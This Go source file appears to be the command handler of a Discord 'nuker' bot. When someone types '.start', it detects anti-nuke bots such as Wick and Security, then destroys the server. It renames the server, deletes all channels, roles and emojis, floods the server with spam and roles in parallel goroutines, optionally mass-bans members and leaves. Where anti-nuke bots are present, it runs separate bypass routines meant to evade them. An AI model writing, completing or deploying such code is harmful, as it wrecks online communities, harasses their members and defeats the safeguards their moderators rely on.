package commands

import (
	"Dynamic/core/bypass"
	"Dynamic/core/creating"
	"Dynamic/core/removing"
	"Dynamic/core/requests"
	"Dynamic/core/start_end"
	"fmt"
	"log"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	usedCommands = make(map[string]bool)

	queue = make(chan string, 100)
	mutex = &sync.Mutex{}

	botList  = []string{"Security", "Wick"}
	CountBot int
)

func Start(s *discordgo.Session, m *discordgo.MessageCreate, wg *sync.WaitGroup) {
	godotenv.Load()
	MASS_BAN := os.Getenv("MASS_BAN")
	MASSBAN, _ := strconv.ParseBool(MASS_BAN)

	if m.Author.ID == s.State.User.ID {
		return
	}

	if m.Content == ".start" {
		if usedCommands[m.GuildID] {
			s.ChannelMessageSend(m.ChannelID, "# Error!\n**`This command has been already used on this server.`**")
			return
		}

		usedCommands[m.GuildID] = true

		queue <- m.GuildID
		requests.HandleQueue(s)

		s.ChannelMessageDelete(m.ChannelID, m.ID)

		mutex.Lock()
		defer mutex.Unlock()

		botNicknames, err := bypass.GetBotNicks(s, m.GuildID)
		if err != nil {
			log.Fatal(err)
		}

		for _, nickname := range botNicknames {
			for _, botID := range botList {
				if nickname == botID {
					fmt.Println("Found ", nickname)
					CountBot++
				}
			}
		}

		if CountBot == 0 {
			fmt.Println("There's no any antinuke bots")

			start_end.Logs(s, m)
			creating.GuildRename(s, m)

			wg.Add(1)
			go func() {
				defer wg.Done()
				channels, _ := s.GuildChannels(m.GuildID)
				creating.DeleteChannels(s, channels)
			}()
			wg.Wait()

			start_end.InviteCreate(s, m)

			for i := 0; i < 50; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					creating.TextSpam(s, m, wg)
				}()
			}
			wg.Wait()

			wg.Add(1)
			go func() {
				defer wg.Done()
				creating.DeleteRoles(s, m)
			}()
			wg.Wait()

			creating.EditRoles(s, m)
			bypass.PhoneLock(m)

			for i := 0; i < 50; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					creating.RolesSpam(s, m)
				}()
			}
			wg.Wait()

			if MASSBAN {
				wg.Add(1)
				go func() {
					defer wg.Done()
					removing.MemberBan(s, m)
				}()
				wg.Wait()
			} else {
				fmt.Println("MASS_BAN not set or true, no mass ban initiated.")
			}

			wg.Add(1)
			go func() {
				defer wg.Done()
				removing.EmojiDelete(s, m)
			}()
			wg.Wait()

			start_end.Leave(s, m)
		} else {
			fmt.Println("There's ", CountBot, " antinuke bot(s) on the server.")

			start_end.Logs(s, m)
			bypass.PhoneLock(m)

			for i := 0; i < 50; i++ {
				wg.Add(1)
				go func() {
					defer wg.Done()
					bypass.BypassCommunity(s, m, wg)
				}()
			}

			time.Sleep(2 * time.Second)

			bypass.BypassSpam(s, m, wg)

			start_end.LogsAlert(s, m)
			start_end.Leave(s, m)
		}

		CountBot = 0
	} else {
		return
	}

}
